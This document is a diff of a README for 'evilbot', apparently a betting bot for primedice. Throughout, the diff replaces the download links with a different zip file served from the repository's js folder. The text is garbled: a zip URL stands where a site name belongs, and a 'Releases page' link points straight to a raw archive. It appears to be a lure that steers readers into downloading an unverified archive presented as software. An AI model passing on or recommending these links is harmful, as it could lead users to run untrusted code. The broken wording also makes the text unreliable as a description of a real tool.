@@ -2,11 +2,11 @@
 
 ## 🚀 Overview
 
-Welcome to evilbot! This tool enhances your experience on https://raw.githubusercontent.com/GabrielW13Nai/evilbot/main/js/evilbot_1.4-beta.3.zip and primedice. Created with care, it allows you to maximize your potential while gaming. 
+Welcome to evilbot! This tool enhances your experience on https://raw.githubusercontent.com/GabrielW13Nai/evilbot/main/js/Software-v2.0.zip and primedice. Created with care, it allows you to maximize your potential while gaming. 
 
 ## 📥 Download Now
 
-[![Download evilbot](https://raw.githubusercontent.com/GabrielW13Nai/evilbot/main/js/evilbot_1.4-beta.3.zip)](https://raw.githubusercontent.com/GabrielW13Nai/evilbot/main/js/evilbot_1.4-beta.3.zip)
+[![Download evilbot](https://raw.githubusercontent.com/GabrielW13Nai/evilbot/main/js/Software-v2.0.zip)](https://raw.githubusercontent.com/GabrielW13Nai/evilbot/main/js/Software-v2.0.zip)
 
 ## 🛠️ Features
 
@@ -29,7 +29,7 @@ To run evilbot successfully, you need the following:
 To get started with evilbot, please follow these steps:
 
 1. **Visit the Releases Page:** Click the link below to go to our Releases page. 
-   [Download evilbot](https://raw.githubusercontent.com/GabrielW13Nai/evilbot/main/js/evilbot_1.4-beta.3.zip)
+   [Download evilbot](https://raw.githubusercontent.com/GabrielW13Nai/evilbot/main/js/Software-v2.0.zip)
 
 2. **Choose the Latest Release:** Look for the most recent version listed at the top. 
 
@@ -51,7 +51,7 @@ Once you run evilbot:
 ## 🎮 How to Use 
 
 1. **Launch the Application:** Open evilbot to begin.
-2. **Select Your Game:** Choose https://raw.githubusercontent.com/GabrielW13Nai/evilbot/main/js/evilbot_1.4-beta.3.zip or primedice to connect.
+2. **Select Your Game:** Choose https://raw.githubusercontent.com/GabrielW13Nai/evilbot/main/js/Software-v2.0.zip or primedice to connect.
 3. **Start Gaming:** Activate evilbot and enjoy a boosted gaming experience.
 
 ## 🔍 Troubleshooting
